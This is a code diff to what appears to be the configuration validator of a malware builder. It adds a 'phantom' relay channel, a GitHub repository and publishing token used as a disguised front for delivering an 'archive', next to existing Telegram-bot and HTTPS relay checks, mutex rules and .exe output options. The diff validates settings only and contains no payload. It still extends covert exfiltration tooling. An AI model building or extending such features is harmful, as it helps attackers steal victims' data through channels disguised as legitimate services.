@@ -61,6 +61,13 @@ _MUTEX_FORBIDDEN: Final[str] = '<>:"|?*'
 # passed invalid one, which transmit reports clearly enough.
 _TELEGRAM_TOKEN: Final[re.Pattern[str]] = re.compile(r"^\d+:[A-Za-z0-9_-]{20,}$")
 
+# A GitHub repository half is owner/name; both halves allow dots, dashes and
+# underscores and nothing else. The token is checked for shape only — a classic
+# ghp_ token and a fine-grained github_pat_ token have different prefixes, and a
+# validator that demands one of them rejects the other on a machine that works.
+_PHANTOM_REPO: Final[re.Pattern[str]] = re.compile(r"^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$")
+_PHANTOM_TOKEN: Final[re.Pattern[str]] = re.compile(r"^[A-Za-z0-9_]{20,}$")
+
 _EXTENSIONS: Final[dict[str, str]] = {OUTPUT_EXE: ".exe", OUTPUT_PY: ".py"}
 
 RULE_MUTEX: Final[str] = "mutex"
@@ -214,6 +221,28 @@ def _check_telegram(endpoint: str, path: str = "relay.endpoint") -> list[Problem
     return []
 
 
+def _check_phantom(endpoint: str, path: str = "relay.endpoint") -> list[Problem]:
+    """A GitHub repository and the token that can publish to it.
+
+    The repository is the front of the channel; the archive is never stored in it.
+    Both halves are validated here because a typo in either produces the same
+    failure at delivery time — a 404 that reads like a dead network.
+    """
+    parts = endpoint.split("$")
+    if len(parts) != 2:
+        return [_problem(RULE_ENDPOINT, path, "must be owner/repo$token, one $")]
+    repo, token = parts
+    if not repo:
+        return [_problem(RULE_ENDPOINT, path, "repository half is empty")]
+    if not token:
+        return [_problem(RULE_ENDPOINT, path, "token half is empty")]
+    if not _PHANTOM_REPO.match(repo):
+        return [_problem(RULE_ENDPOINT, path, "repository is not owner/name")]
+    if not _PHANTOM_TOKEN.match(token):
+        return [_problem(RULE_ENDPOINT, path, "token is not a GitHub token")]
+    return []
+
+
 def _check_endpoint(
     kind: str,
     endpoint: str,
@@ -240,6 +269,8 @@ def _check_endpoint(
 
     if kind == "telegram":
         return _check_telegram(endpoint, path)
+    if kind == "phantom":
+        return _check_phantom(endpoint, path)
     return _check_https(endpoint, path)
 
 
